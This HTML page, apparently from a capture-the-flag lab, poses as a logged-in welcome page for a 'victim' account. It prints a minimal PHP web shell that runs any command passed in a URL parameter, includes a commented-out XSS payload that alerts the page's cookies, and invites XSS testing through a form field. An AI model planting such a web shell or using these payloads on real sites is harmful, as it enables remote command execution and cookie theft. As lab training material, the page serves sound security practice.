<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700">
<title>Welcome the web authentication page!</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="css/style.css">
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>

</head>
<body>
<div class="signup-form">
    <form action="home.php" method="GET" enctype="multipart/form-data">
		<h2>Welcome the web authentication page!</h2>
    <!-- <script>alert(document.cookie);</script> -->
        <br>

            
        <img src="imgs/personal_photo.jpg" height="150" width="150" style="border-radius:50%;display:block;margin-left:auto;margin-right:auto;" />

		<p class="hint-text"><br><b>Welcome </b>admin@victim.com</p>

		<p>Today is 2023-04-17 15:34:35</p><p class="hint-text"><br><b>There is a webshell.php file you can use to execute system command. You can refer the follow php code to launch an attack to catch the flag. </b> <br /> \<\?php <br />  $cmd = $_GET["cmd"]; <br /> system($cmd); <br /> \?\></p>
        <br />
		<h5 class="hint-text">You can test the XSS vulnerability here:</h5>
        <div class="form-group">
        	<input type="text" class="form-control" name="comments" placeholder="text" required="required">
        </div>
        <div class="form-group">
            <button type="submit" name="save" class="btn btn-success btn-lg btn-block">check</button>
        </div>
        <div class="text-center">Want to Leave the Page? <br><a href="logout.php">Logout</a></div>
    </form>

</div>
</body>
</html>